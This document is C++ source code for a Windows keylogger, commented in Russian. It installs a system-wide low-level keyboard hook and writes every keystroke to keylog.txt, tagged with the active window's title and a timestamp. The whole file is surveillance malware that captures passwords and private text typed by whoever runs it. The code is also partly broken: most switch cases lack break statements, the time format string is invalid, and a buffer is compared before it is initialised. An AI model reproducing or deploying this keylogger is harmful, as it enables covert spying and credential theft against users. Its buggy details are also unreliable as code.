// Подключение необходимых библиотек
#include <iostream>		// Стандартная библиотека ввода-вывода
#include <fstream>		// Файловой библиотека ввода-вывода
#include <time.h> 		//
#include <Windows.h>	//

using namespace std;

int Save(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

ofstream file;

// 
int Save(int key)
{
	char prevProg[256];

	if (key == 1 || key == 2) return 0;

	HWND foreground = GetForegroundWindow();
	DWORD threadId;
	HKL keyboardLayout;

	if (foreground)
	{
		threadId = GetWindowThreadProcessId(foreground, NULL);
		keyboardLayout = GetKeyboardLayout(threadId);

		char crrProg[256];

		GetWindowText(foreground, crrProg, 256);

		if (strcmp(crrProg, prevProg) != 0)
		{
			strcpy_s(prevProg, crrProg);
			time_t t = time(NULL);

			struct tm *tm = localtime(&t);
			char c[64];

			strftime(c, sizeof(c), "%", tm);

			file << "\n\n\n[Program: " << crrProg << " DateTime: " << c << "]";
		}
	}

	cout << key << endl;

	switch (key)
	{
		case VK_BACK:
		{
			file << "BACKSPACE";
			break;
		}
		case VK_RETURN:
		{
			file << "\n";
			break;
		}
		case VK_SPACE:
		{
			file << " ";
		}
		case VK_TAB:
		{
			file << "[TAB]";
		}
		case VK_SHIFT:
		{
			file << "[SHIFT]";
		}
		case VK_LSHIFT:
		{
			file << "[SHIFT]";
		}
		case VK_RSHIFT:
		{
			file << "[SHIFT]";
		}
		case VK_CONTROL:
		{
			file << "[CTRL]";
		}
		case VK_RCONTROL:
		{
			file << "[CTRL]";
		}
		case VK_LCONTROL:
		{
			file << "[CTRL]";
		}
		case VK_ESCAPE:
		{
			file << "[ESC]";
		}
		case VK_END:
		{
			file << "[END]";
		}
		case VK_HOME:
		{
			file << "[HOME]";
		}
		case VK_LEFT:
		{
			file << "[LEFT]";
		}
		case VK_RIGHT:
		{
			file << "[RIGHT]";
		}
		case VK_UP:
		{
			file << "[UP]";
		}
		case VK_DOWN:
		{
			file << "[DOWN]";
		}
		case 190:
		{
			file << ".";
		}
		case 110:
		{
			file << ".";
		}
		case 189:
		{
			file << "-";
		}
		case 109:
		{
			file << "-";
		}
		case 20:
		{
			file << "[CAPS]";
		}
		default:
		{
			char crrKey;
			bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) lower = !lower;

			crrKey = MapVirtualKeyExA(key, MAPVK_TO_CHAR, keyboardLayout);

			if (!lower)
			{
				crrKey = tolower(crrKey);
			}

			file << char(crrKey);
		}
	}

	file.flush();

	return 0;
}

// 
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 & wParam == WM_KEYDOWN)
	{
		kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

		Save(kbStruct.vkCode);
	}

	return CallNextHookEx(hook, nCode, wParam, lParam);
}

// Главная функция
int main()
{
	file.open("keylog.txt");

	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) MessageBox(NULL, "Something has gone wrong!", "Error", MB_ICONERROR);

	MSG message;

	while (true) GetMessage(&message, NULL, 0, 0);
}